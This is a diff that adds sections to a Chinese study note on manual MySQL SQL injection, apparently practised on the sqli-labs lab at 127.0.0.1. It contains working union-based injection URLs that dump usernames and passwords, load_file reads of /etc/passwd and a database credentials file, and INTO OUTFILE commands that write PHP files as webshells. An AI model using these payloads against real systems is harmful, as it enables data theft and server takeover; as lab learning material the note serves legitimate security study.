@@ -17,7 +17,9 @@ tags: web安全 sql注入
 	- mysql注入语句-万能密码
 	- mysql注入语句-注入语句例子
 - sql注入流程
-- 
+- MySQL手工注入方法
+- TIPS
+- 实例
 - 相关链接
 
 <!-- /MarkdownTOC -->
@@ -139,7 +141,146 @@ tags: web安全 sql注入
 	梳理业务流程  
 
 
-## 
+## MySQL手工注入方法
+
+**MySQL数据库结构**  
+
+- Mysql
+	- 连接层
+		- 通信协议
+		- 线程
+		- 验证
+	- SQL层
+		- 解析器
+		- 授权
+		- 优化器
+		- 查询执行
+		- 查询高速缓存
+		- 查询日志记录
+
+**SQL层的功能**	  
+
+1. 判断语法、语句、语义
+2. 数据库对象授权情况判断，授权失败不继续
+3. 解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式
+4. 优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”
+5. 执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式
+6. 将取数据的方式，交由下层（存储引擎层）进行处理
+7. 最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前
+8. 查询缓存：缓存之前查询的数据
+
+**MySQL内置库（>=5.7）**  
+
+mysql: 账户信息、权限信息、存储过程、event、时区等信息。  
+
+sys: 存储过程、自定义函数、视图帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）  
+
+performance_schema: 用于收集数据库服务器性能参数  
+
+information_schema: 访问数据库元数据的方式，保存关于MySQL服务器所维护的所有其他数据库信息，如数据库名，数据库表，表的数据类型与访问权限等。
+
+**查询数据核心语法**  
+
+	# 查库
+	select schema_name from information_schema.schemata
+
+	#查表
+	select table_name from information_schema.tables where table_schema=库名
+
+	#查列
+	select column_name from information_schema.columns where table_name=表名
+
+	#查数据
+	select 列名 from 库名.表名
+
+**Tips**  
+
+提示1: 所有类型的sql注入，都是基于查库、表、列语句  
+提示2: 如果数据太多，导致无法返回查询结果：  
+	查询的场景：可利用limit限定返回数量及为止，依次查询  
+	`select username,password from security.users limit 0,1;` 
+	回显数据的场景：* concat * 链接多个数据成为一条返回结果  
+	`select group_concat(schema_name) from infromation_schema.schemata;`
+提示3: 在一些场景，想要快速获取数据，需要借助工具，如：BurpSuite  
+
+**sql注入流程**  
+
+- SQL注入
+	- 信息搜集
+		- 数据库类型
+			- 报错信息 
+			- 特有语句（不同数据库版本）
+		- 数据库版本
+		- 数据库用户
+		- 判断数据库权限
+	- 数据获取
+		- 获取库信息
+			- 获取当前库
+			- 获取所有库
+		- 获取表信息
+		- 获取列信息
+		- 获取数据
+	- 提权
+		- 根据数据库权限
+			- 执行系统命令
+				- 直接提权（mssql：调用xp.cmdshell执行系统命令、mysql：写木马到网站目录、sqlmap --os-shell（os shell会上传两个文件一个木马  一个是创建文件 富于这个文件775的权限控制权限））
+			- 读文件
+				- 读数据库配置文件,尝试远程连接
+				- 读系统配置文件，搜集信息
+				- select load_file('/etc/passwoed')
+			- 写文件
+				- 写webshell到网站目录 
+				- outfile (需要绝对路径) （格式： select * into outfile "文件地址" 示例：select * info outfile 'f:/mysql/test/one' form teacher_class; ）
+
+## TIPS
+
+mysql写shell
+>1.需要知道绝对路径(web下层目录)
+>2.用户需要file权限(root可写)，一般用户不会有file权限
+>3.文件大小小于max_allow_upload
+>4.secure_file_priv 指定可写目录
+
+写
+	
+	select '<?php phpinfo();?>' into outfile 'c://php//www//kkk.php';
+	select '<?php phpinfo();?>' into dumpfile 'c://php//www//kkk2.php';
+	select * from user into outfile 'c://php//www/kkk4.php' fields terminated by '<?php phpinfo();?>'
+
+---
+
+## 实例
+
+tips:  
+> 查询数据的时候把信息记录到txt上
+
+	# 判断是否存在sql注入 
+	http://127.0.0.1/Less-1/?id=2' 
+	http://127.0.0.1/Less-1/?id=2' and '1'=2
+
+	# 判断列数
+	http://127.0.0.1/Less-1/?id=2' order by 3--+
+
+	# 判断输出信息位置 (union之前要报错才会查询union后面的)
+	http://127.0.0.1/Less-1/?id=99999' union select 1,2,3--+
+
+	# 查库名
+	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+
+
+	# 查表名 'security'/十六进制0x/database()
+	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema='security'--+
+
+	# 查数据 group_concat/concat_ws
+	http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+
+
+	# 查权限
+	http://127.0.0.1/Less-1/?id=' union select 1,2,(select user())--+ 
+
+	> root@localhost 
+
+	#  读文件 db-creds.inc 数据库配置文件
+	http://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 
+
+
 
 ## 相关链接
 
@@ -149,5 +290,8 @@ tags: web安全 sql注入
 [mysql正则](http://www.runoob.com/mysql/mysql-regexp.html)  
 [MYSQL updatexml报错注入](https://blog.csdn.net/vspiders/article/details/77430024)  
 [Python Spider 的总结](https://blog.csdn.net/i_peter/article/details/53380334)  
+[MySQL手工注入步骤+直接写入一句话](https://blog.csdn.net/hxsstar/article/details/19337461)  
+[Mysql通过命令授于用户数据库操作权限](https://blog.csdn.net/m2417599488/article/details/72236666)  
+[mysql 函数执行权限](https://blog.csdn.net/zhaoyangjian724/article/details/52121193)  
 
 
